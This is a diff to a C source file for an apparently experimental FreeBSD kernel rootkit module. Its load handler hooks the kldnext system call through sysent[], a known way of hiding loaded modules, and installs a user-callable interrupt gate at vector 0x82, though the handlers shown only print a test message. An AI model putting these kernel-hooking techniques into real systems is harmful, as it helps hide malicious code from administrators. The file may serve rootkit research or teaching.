@@ -16,14 +16,10 @@
 #include <sys/lock.h>
 #include <sys/sx.h>
 
-#include <sys/cdefs.h>
-
 #include "rootkit.h"
 
-#define	IDTVEC(name)	__CONCAT(X,name)
-
-
-int testFunc(void);
+void testFunc2(void);
+void testFunc(void);
 
 /* The offset in sysent[] where the system call is to be allocated. */
 static int offset = NO_SYSCALL;
@@ -48,10 +44,12 @@ static int main(struct thread *td, void *syscall_args) {
 	return(0);
 }
 
-
-int testFunc() {
+void testFunc2() {
 	printf("HELLO WORLD!!!!\n");
-	return 0;
+}
+
+void testFunc() {
+	testFunc2();
 }
 
 /* The function called at load/unload. */
@@ -64,10 +62,7 @@ static int load(struct module *module, int cmd, void *arg) {
 		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext_hook;
 		printf("kldnext hooked\n");
 
-		printf("%p\n", &idt);
-		printf("%p\n", &idt[0]);
-
-		setidt(IDT_SYSCALL, &IDTVEC(testFunc), SDT_SYS386IGT, SEL_UPL, GSEL(GCODE_SEL, SEL_KPL));
+		setidt(0x82, testFunc, SDT_SYS386IGT, SEL_UPL, GSEL(GCODE_SEL, SEL_KPL));
 
 		break;
 
